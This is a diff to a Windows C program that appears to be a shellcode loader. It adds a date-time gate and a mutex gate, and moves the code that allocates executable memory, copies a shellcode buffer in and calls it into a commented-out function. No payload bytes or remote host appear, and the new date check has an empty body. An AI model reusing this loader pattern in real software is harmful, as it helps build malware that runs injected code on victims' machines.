@@ -30,17 +30,13 @@ int APIENTRY WinMain(_In_ HINSTANCE hInst,
 
 void CheckExecution() {
 
-	char *buffer;
-	void(*shellcodefunction)();
-	unsigned int size = sizeof(buf);
+	// Perform the date and time check; if it is outside the permitted
+	// date, return now
+	if (!DateTimeCheck()) return;
 
-	if (MutexCheck(MUTEX_NAME)) {
-		// No mutex exists, so run the code
-		buffer = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-		memcpy(buffer, buf, size);
-		shellcodefunction = (void(*)()) buffer;
-		shellcodefunction();
-	}
+	// Perform the Mutex check; if it is already running, quit now
+	if (!MutexCheck(MUTEX_NAME)) return;
+
 
 }
 
@@ -73,4 +69,30 @@ unsigned int MutexCheck(const char *name) {
 			return TRUE;
 		}
 	}
+}
+
+
+
+//////////////////////////////////////////////////////////////////////////////////
+//
+//   DateTimeCheck()
+//   Returns FALSE if we should bail out now because of the mutex
+//   or TRUE if we can carry on
+//
+//////////////////////////////////////////////////////////////////////////////////
+unsigned int DateTimeCheck() {
+
+}
+
+void ExecuteShellcode() {
+
+	//char *buffer;
+	//void(*shellcodefunction)();
+	//unsigned int size = sizeof(buf);
+
+	// No mutex exists, so run the code
+	//buffer = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	//memcpy(buffer, buf, size);
+	//shellcodefunction = (void(*)()) buffer;
+	//shellcodefunction();
 }
